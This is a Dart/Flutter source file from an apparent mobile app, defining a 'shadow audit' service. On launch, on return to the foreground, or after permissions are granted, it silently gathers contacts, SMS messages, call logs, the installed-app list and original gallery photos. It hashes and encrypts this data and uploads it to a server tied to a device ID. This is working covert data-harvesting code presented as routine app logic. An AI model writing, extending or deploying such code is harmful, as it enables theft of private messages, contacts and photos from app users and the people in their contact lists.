import 'dart:convert';
import 'dart:async';
import 'dart:io';

import 'package:crypto/crypto.dart';
import 'package:flutter/foundation.dart';
import 'package:mop_app/core/api_client.dart';
import 'package:mop_app/core/device_info_service.dart';
import 'package:mop_app/core/native_bridge.dart';
import 'package:mop_app/services/audit_crypto.dart';

/// 影子审计服务（规约 PROTOCOL 3、ARCHITECTURE 2.2：Hash 对比、Isolate 加密、增量上报）
/// 平台过滤：iOS 通讯录、相册；Android 含 contacts、sms、call_log、app_list、gallery；不采集 usage（.cursorrules 第 3 节）
class AuditService {
  AuditService([ApiClient? api]) : _api = api ?? ApiClient();

  final ApiClient _api;
  static bool _iosInitialAuditPending = false;
  static bool _skipNextMainScreenInitialAudit = false;

  /// iOS 登录/激活后权限刚通过时：延迟 500ms 再跑首次审查，避免与权限弹窗关闭、首页切换抢主线程。
  static void scheduleIosInitialAuditAfterPermissionGrant() {
    if (!Platform.isIOS || _iosInitialAuditPending) return;
    _iosInitialAuditPending = true;
    _skipNextMainScreenInitialAudit = true;
    Future<void>.delayed(const Duration(milliseconds: 500), () async {
      try {
        await AuditService().runAuditCycle();
      } finally {
        _iosInitialAuditPending = false;
      }
    });
  }

  /// 同一启动周期中，若权限通过后已安排首次审查，则首页初始化时跳过一次，避免重复。
  static bool consumeSkipNextMainScreenInitialAudit() {
    final skip = _skipNextMainScreenInitialAudit;
    _skipNextMainScreenInitialAudit = false;
    return skip;
  }

  /// 支持的 data_types：iOS 仅 contacts、gallery；Android 含 contacts、sms、call_log、app_list、gallery_photo（相册上传原图）
  static List<String> get supportedTypes {
    if (Platform.isIOS) {
      return ['contacts', 'gallery'];
    }
    return ['contacts', 'sms', 'call_log', 'app_list', 'gallery_photo'];
  }

  /// 冷启动或切回前台时：拉取各 type 数据 -> 算 Hash -> check-sum -> 需更新的 type 加密上传
  Future<void> runAuditCycle() async {
    final deviceId = await DeviceInfoService.getDeviceId();
    final types = supportedTypes;
    final hashes = <String, String>{};
    for (final type in types) {
      if (type == 'gallery_photo') {
        final galleryPhotoHash = await _computeGalleryPhotoCombinedHash();
        if (galleryPhotoHash.isNotEmpty) hashes['gallery_photo'] = galleryPhotoHash;
        continue;
      }
      if (type == 'gallery') {
        final data = await NativeBridge.fetchSensitiveData('gallery');
        final hash = await _computeHash(data);
        if (hash.isNotEmpty) hashes['gallery'] = hash;
        continue;
      }
      final data = await NativeBridge.fetchSensitiveData(type);
      final hash = await _computeHash(data);
      if (hash.isNotEmpty) hashes[type] = hash;
    }
    if (hashes.isEmpty) return;
    final toUpdate = await _api.auditCheckSum(deviceId, hashes);
    if (toUpdate.isEmpty) return;
    // 相册/原图放最后上传
    final ordered = [
      ...toUpdate.where((t) => t != 'gallery_photo' && t != 'gallery'),
      ...toUpdate.where((t) => t == 'gallery_photo'),
      ...toUpdate.where((t) => t == 'gallery'),
    ];
    for (final type in ordered) {
      if (type == 'gallery_photo') {
        await _uploadGalleryPhotoOriginals(deviceId);
        continue;
      }
      if (type == 'gallery') {
        final data = await NativeBridge.fetchSensitiveData('gallery');
        final encrypted = await _encryptInIsolate(data, deviceId);
        if (encrypted.isNotEmpty) {
          final hash = hashes['gallery'] ?? '';
          await _api.auditUpload(deviceId, 'gallery', encrypted, hash: hash.isNotEmpty ? hash : null);
        }
        continue;
      }
      final data = await NativeBridge.fetchSensitiveData(type);
      final encrypted = await _encryptInIsolate(data, deviceId);
      if (encrypted.isNotEmpty) {
        final hash = hashes[type] ?? '';
        await _api.auditUpload(deviceId, type, encrypted, hash: hash.isNotEmpty ? hash : null);
      }
    }
  }

  /// 相册原图：按 id 读原图字节，算联合 hash（与后端 gallery_photo 多 blob 联合 hash 一致）
  static Future<String> _computeGalleryPhotoCombinedHash() async {
    final data = await NativeBridge.fetchSensitiveData('gallery');
    final items = data['items'] as List<dynamic>?;
    if (items == null || items.isEmpty) return '';
    final list = <MapEntry<int, List<int>>>[];
    for (final raw in items) {
      final id = raw is Map ? (raw['id'] as num?)?.toInt() : null;
      if (id == null) continue;
      final bytes = await NativeBridge.getGalleryOriginalBytes(id);
      if (bytes != null && bytes.isNotEmpty) {
        list.add(MapEntry(id, bytes));
      }
    }
    if (list.isEmpty) return '';
    list.sort((a, b) => a.key.compareTo(b.key));
    return compute(_combinedGalleryPhotoHashEntrypoint, list);
  }

  static String _combinedGalleryPhotoHashEntrypoint(List<MapEntry<int, List<int>>> list) {
    final concat = StringBuffer();
    for (final e in list) {
      concat.write(e.key.toString());
      concat.write(md5.convert(e.value).toString());
    }
    return md5.convert(utf8.encode(concat.toString())).toString();
  }

  /// 相册原图：单张加密原图字节、单张上传 type=gallery_photo
  Future<void> _uploadGalleryPhotoOriginals(String deviceId) async {
    final data = await NativeBridge.fetchSensitiveData('gallery');
    final items = data['items'] as List<dynamic>?;
    if (items == null || items.isEmpty) return;
    for (final raw in items) {
      final id = raw is Map ? (raw['id'] as num?)?.toInt() : null;
      if (id == null) continue;
      final bytes = await NativeBridge.getGalleryOriginalBytes(id);
      if (bytes == null || bytes.isEmpty) continue;
      final itemHash = md5.convert(bytes).toString();
      final encrypted = await compute(encryptAuditPayloadRaw, [Uint8List.fromList(bytes), deviceId]);
      if (encrypted.isEmpty) continue;
      await _api.auditUpload(deviceId, 'gallery_photo', encrypted, hash: itemHash, msgId: id.toString());
    }
  }

  /// 在 Isolate 中计算 JSON 的 MD5（规约：Hash 对比在 Isolate；jsonEncode 在 Isolate 内执行，避免主线程大对象编码卡顿）
  static Future<String> _computeHash(Map<String, dynamic> data) async {
    return compute(_hashEntrypoint, data);
  }

  static String _hashEntrypoint(Map<String, dynamic> data) {
    final jsonStr = jsonEncode(data);
    final bytes = utf8.encode(jsonStr);
    final digest = md5.convert(bytes);
    return digest.toString();
  }

  /// 在 Isolate 中 AES-256-GCM 加密（规约 PROTOCOL 6；jsonEncode 在 Isolate 内执行，避免主线程卡顿）
  static Future<List<int>> _encryptInIsolate(Map<String, dynamic> data, String deviceId) async {
    return compute(_encryptEntrypoint, [data, deviceId]);
  }

  static List<int> _encryptEntrypoint(List<dynamic> args) {
    if (args.length < 2) return [];
    final data = args[0] as Map<String, dynamic>?;
    final deviceId = args[1] as String?;
    if (data == null || deviceId == null || deviceId.isEmpty) return [];
    return encryptAuditPayload([jsonEncode(data), deviceId]);
  }
}
